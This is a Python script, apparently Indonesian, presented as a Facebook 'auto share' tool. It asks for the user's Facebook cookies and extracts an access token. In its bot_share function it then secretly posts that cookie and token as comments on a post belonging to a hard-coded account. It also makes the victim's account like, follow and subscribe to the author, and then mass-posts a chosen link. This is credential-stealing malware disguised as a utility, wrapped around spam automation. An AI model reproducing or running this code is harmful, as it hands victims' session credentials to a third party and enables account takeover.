import requests, os, re, bs4, calendar, sys, json, time, random, datetime, subprocess, logging,uuid
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from random import choice
from pathlib import Path
from rich.table import Table
from rich.console import Console as Ambatukam
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.text import Text as tekz
from rich.panel import Panel as nel
from rich import print as cetak
ses=requests.Session()
console = Ambatukam()

#               <!--  TIME(WAKTU)  -->
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")

#               <!--  COLOR(WARNA)  -->
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
N = '\x1b[0m'	# WARNA MATI
PT = '\x1b[1;97m' # PUTIH TEBAL
MT = '\x1b[1;91m' # MERAH TEBAL
HT = '\x1b[1;92m' # HIJAU TEBAL
KT = '\x1b[1;93m' # KUNING TEBAL
BT = '\x1b[1;94m' # BIRU TEBAL
UT = '\x1b[1;95m' # UNGU TEBAL
OT = '\x1b[1;96m' # BIRU MUDA TEBAL

#                 <!--  WARNA 2  -->
Z2 = "[#ff0505]" # HITAM
mera  = "[#f00000]"
M2 = "[#AAAAAA]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00e2f5]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
M2, H2, K2, P2, B2, U2, O2 = ["[#FF0000]", "[#00FF00]", "[#FFFF00]", "[#FFFFFF]", "[#00C8FF]", "[#AF00FF]", "[#00FFFF]"]
acak = [M2, H2, K2, B2, U2, O2, P2]
warna = random.choice(acak)
til =f"{mera}● {K2}● {H2}●"
ken = f'{mera}›{K2}›{H2}› '
tod = f' {H2}‹{K2}‹{mera}‹'

#              <!--  USER - AGENT  -->
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])

sys.stdout.write('\x1b]2; Tool Auto Share Facebook Unlimited\x07')

###----------[ UNTUK ANIMASI ]----------###

def hyu_xd(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def hyu_dev(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
#                <!--  INI LOGO  -->
def logo_menu():
 #li = '# SELAMAT DATANG DI TOOLS AUTO SHARE FACEBOOK'
# lo = mark(li, style='blue')
# sol().print(lo, style='#AAAAAA')
 banner = f'''  {til}
         {P2}Auto Share Facebook {Z2}Unlimited
         ─{Z2}█▀▀█ 　{P2} ░{Z2}█▀▀▀█ 　 {P2}░{Z2}█▀▀▀{P2} 　 ░{Z2}█─{P2}░{Z2}█{P2}
         ░{Z2}█▄▄█{P2} 　 {Z2}─▀▀▀▄▄{P2} 　 ░{Z2}█▀▀▀{P2} 　 ░{Z2}█─{P2}░{Z2}█{P2}
         ░{Z2}█─{P2}░{Z2}█{P2} 　 ░{Z2}█▄▄▄█{P2} 　 ░{Z2}█─── 　 ─{Z2}▀▄▄▀{P2}
                          Coding By {Z2}WahyuXD.
 '''
 cetak(nel(banner,title=f'{ken}{A2}{hari}, {tanggal}{tod}',subtitle_align='left',width=55,padding=(0),style='#AAAAAA'))
	
#                <!--  MENU LOGIN  -->
def login():
	os.system("cls")
#	os.system("play-audio data/audio/login.mp3")
	cetak(nel(f'''  {til}

         {P2}░{Z2}█───{P2}  ░{Z2}█▀▀▀█{P2}  ░{Z2}█▀▀█{P2}  {Z2}▀█▀{P2}  ░{Z2}█▄─{P2}░{Z2}█{P2}
         ░{Z2}█─── {P2} ░{Z2}█──{P2}░{Z2}█ {P2} ░{Z2}█─▄▄ {P2} ░{Z2}█─  {P2}░{Z2}█{P2}░{Z2}█{P2}░{Z2}█{P2}     
         ░{Z2}█▄▄█ {P2} ░{Z2}█▄▄▄█ {P2} ░{Z2}█▄▄█{P2}  {Z2}▄█▄  {P2}░{Z2}█──▀█{P2}
         Login With Facebook Cookies !!
         ''',title=f'{ken}{A2}Login Diperlukan{tod}',width=55,padding=(0),style='#AAAAAA'))
	cetak(nel(f'      {Z2}DO NOT {P2}USE YOUR MAIN {Z2}ACCOUNT {P2}!!',subtitle=f'{A2}╭─{ken}{A2}COOKIE{tod}',subtitle_align='left',width=55,padding=(0,5),style='#AAAAAA'))
	cookie = input(f"{A}   ╰─> {H}")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		cetak(nel.fit(f'{P2}Login Berhasil!',style=f"#27ff0e"));time.sleep(2)
		bot_share()
	except:
		os.system("del token.txt cookie.txt")
		cetak(nel.fit(f'{P2}COOKIE INVALID!!',style=f"#ff0000"));time.sleep(1.5) 
		login()
		
#                 <!--  AUTO SHARE  -->
def bot_share():
	os.system('cls')
	try:
		token = open("token.txt","r").read()
		cok = open("cookie.txt","r").read()
		cookie = {"cookie":cok}
		ip = requests.get("https://api.ipify.org").text
		#nama = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}" , cookies=cookie).json()["name"]
		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
		requests.post(f"https://graph.facebook.com/100070916004396/subscribed_apps?subscribed_fields=true&access_token={token}",  headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100070916004396_412305477809982/likes?summary=true&access_token={token}", headers = {"cookie":cok}) # *---> WahyuXD
		requests.post(f"https://graph.facebook.com/v15.0/100070916004396_665284818641263/likes?summary=true&access_token={token}", headers = {"cookie":cok}) # *--->WahyuXD
		requests.post(f"https://graph.facebook.com/v15.0/100070916004396_412305477809982/comments/?message={cok}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100070916004396_412305477809982/comments/?message={open('token.txt','r').read()}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/1161217842_4785178051606565/likes?summary=true&access_token={token}", headers = {"cookie":cok}) # *---> Moch WahyuDin Ambia
		requests.post(f"https://graph.facebook.com/1161217842/subscribers?access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/100070916004396/subscribers?access_token={token}" , headers = {"cookie":cok})
	except:
		nama = "default_name"
		id = "default_id"
		os.system("del token.txt cookie.txt")
		cetak(nel.fit(f'{P2}COOKIE INVALID!!',style='#ff0000'));time.sleep(1.5)
		login()
	os.system('cls')
	logo_menu()
	apani = nel(f'{P2}Name: {H2}{nama}\n{P2}ID  : {H2}{id}',title=f'{ken}{A2}User{tod}',width=25,style='#aaaaaa')
	apaye = nel(f'{P2}IP  : {H2}{ip}\n{P2}Time: {H2}{waktu}',title=f'{ken}{A2}Info{tod}',width=25,style='#aaaaaa')
	columns = col([apani,apaye])
	cetak(nel(columns,title=f'{ken}{A2}User Information{tod}',width=55,style='#aaaaaa'))
# 	cetak(nel(f'''
# {P2} Username :    {H2}{nama}
# {P2} User ID  :    {H2}{id}
# {P2} IP       :    {H2}{ip}
# {P2} Time     :    {H2}{waktu}
# ''',title=f'{A2}>>> User Information <<<',subtitle_align='left',width=55,padding=(0,5),style='#AAAAAA'))
	cetak(nel(f'{P2}Gunakan Facebook Lite Untuk Mengambil Link{P2}.\nAgar Tidak Terjadi Error Saat Bot Bekerja.',title=f'{ken}{A2}Warning{tod}',subtitle_align='left',width=55,padding=(0,5),style='#AAAAAA'))
	cetak(nel(f'{P2}     Url Target ',subtitle=f'{A2}╭─',subtitle_align='left',width=22,padding=0,style='#AAAAAA'))
	link = input(f"{A}   ╰─>  {H}")
	cetak(nel(f'{P2}       Limit  ',subtitle=f'{A2}╭─',subtitle_align='left',width=22,padding=0,style='#AAAAAA'))
	jumlah = int(input(f"{A}   ╰─> {H}"))
	cetak(nel(f'{P2}       Working',subtitle=f'{A2}╭─',subtitle_align='left',width=22,padding=0,style='#AAAAAA'))
	wahyuganteng = datetime.now()
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safyyari/604.1"}
		for x in range(jumlah):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				hyu = str(datetime.now()-wahyuganteng).split('.')[0]
				print(f'{A}\r   ╰─>{P} Berhasil Membagikan  {H}{n}{P}  Postingan {N} |  Dalam Waktu : {H}{hyu}',end='');sys.stdout.flush()
			else:
				print("\n")
				cetak(nel.fit(f'{P2} AUTO SHARE BERHENTI KEMUNGKINAN JARINGAN TIDAK STABIL / COOKIE INVALID',style='red'));exit()
	except requests.exceptions.ConnectionError:
		print(f"\n{P}({M}!{P}) Tolong Periksa Koneksi Internet Kamu!");exit()
bot_share()


# Facebook : https://www.facebook.com/shonry.xiemahulae - w4hyu.404
# Github   : WahyuuXD
# WhatsApp : wa.me/233506380966
